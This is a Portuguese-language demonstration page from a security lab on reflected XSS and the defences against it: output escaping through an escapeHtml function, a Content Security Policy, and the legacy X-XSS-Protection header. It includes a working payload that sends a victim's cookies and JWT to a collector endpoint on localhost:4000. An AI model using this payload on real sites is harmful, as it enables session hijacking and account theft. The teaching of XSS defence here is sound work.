XSS REFLETIDO
⚡ Payload de demonstração — cole na barra de busca 
<script>new Image().src='http://localhost:4000/capture?type=reflected&data='+encodeURIComponent(document.cookie)+'&jwt='+encodeURIComponent(localStorage.getItem('token'))</script>

Refletido de volta na resposta da busca. Rouba cookie e JWT e envia ao C2 (:4000). Aqui o escapeHtml o transforma em texto antes de chegar ao HTML.

🛡️ O payload foi escapado pelo servidor — <script> vira &lt;script&gt; no HTML. O navegador renderiza como texto, não executa como código.

🛡️ Defesas Aplicadas Aqui

✅
Escape de Saída (Output Encoding) A função escapeHtml() converte < > & " ' em entidades HTML antes de inserir no template. 
function escapeHtml(str) {
  return String(str)                    // ① garante que é texto
    .replace(/&/g, '&amp;')             // ② troca  &  por  &amp;
    .replace(/</g, '&lt;')              // ③ troca  <  por  &lt;
    .replace(/>/g, '&gt;')              // ④ troca  >  por  &gt;
    .replace(/"/g, '&quot;')            // ⑤ troca  "  por  &quot;
    .replace(/'/g, '&#x27;');           // ⑥ troca  '  por  &#x27;
}
✅
Content Security Policy script-src 'self' — mesmo que o escape falhasse, o CSP bloquearia qualquer script inline.
✅
X-XSS-Protection (legado) Header enviado apenas por compatibilidade com browsers antigos — os navegadores modernos removeram esse filtro. Não é uma defesa real hoje; quem protege de fato é o escape de saída + CSP acima.
